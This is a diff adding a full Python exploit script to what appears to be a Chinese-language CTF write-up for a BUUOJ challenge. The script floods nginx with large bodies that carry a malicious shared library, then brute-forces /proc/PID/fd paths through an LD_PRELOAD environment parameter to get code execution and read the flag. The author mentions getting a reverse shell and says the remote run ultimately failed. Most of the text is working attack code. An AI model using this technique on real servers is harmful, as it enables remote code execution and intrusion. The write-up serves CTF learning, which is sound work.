@@ -90,6 +90,70 @@ gcc hacklib.c -shared -fPIC -o hacklib.so -ldl，-ldl不加也行，最终编译
 
 ### 贴一份完整的Python脚本
 ```
+import threading, requests, time
 
+URL = f'http://94398b21-7016-4eb8-a479-93a5b97e536f.node4.buuoj.cn:81/'
+large_body = open("hacklib.so", "rb").read() + (16 * 1024 * 'A').encode()
+
+done = False
+flag = ""
+
+
+# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
+def uploader():
+    print('[+] starting uploader')
+    while not done:
+        requests.post(URL, data=large_body)
+
+
+# 16 threads keep on sending large body.
+for _ in range(1):
+    threading.Thread(target=uploader).start()
+
+
+def try_get_flag():
+    global done, flag
+    r = requests.get(URL + "flag")
+    print("trying to get flag")
+    if r.status_code == 200:
+        if "{" in r.text:
+            done = True
+            flag = r.text
+            print("flag:", flag)
+            return
+    print("get flag failed")
+
+
+def bruter(pid):
+    print(f'[+] brute loop restarted: {pid} \n')
+    for fd in range(4, 100):
+        f = f'/proc/{pid}/fd/{fd}'
+        # print(f)
+        try:
+            r = requests.get(URL, params={
+                'env': 'LD_PRELOAD=' + f,
+            })
+        except Exception:
+            pass
+    try_get_flag()
+
+
+def bruser_group(start_pid, count):
+    while not done:
+        current_pid = start_pid
+        while count > 0:
+            bruter(current_pid)
+            count -= 1
+            current_pid += 1
+
+
+# if test locally, can use pid; else need to brute.
+# nginx_workers = [ 266, 268, 32831, 33666, 9]
+for i in range(2, 20):
+    threading.Thread(target=bruser_group, args=(i * 50, 50)).start()
 ```
 还是反弹shell出来的，，一顿操作虚拟机Ubuntu图形界面给我搞没了，，
+
+不过最终还是没扫出来，buu的环境动不动就G
+
+anyway学到了很多
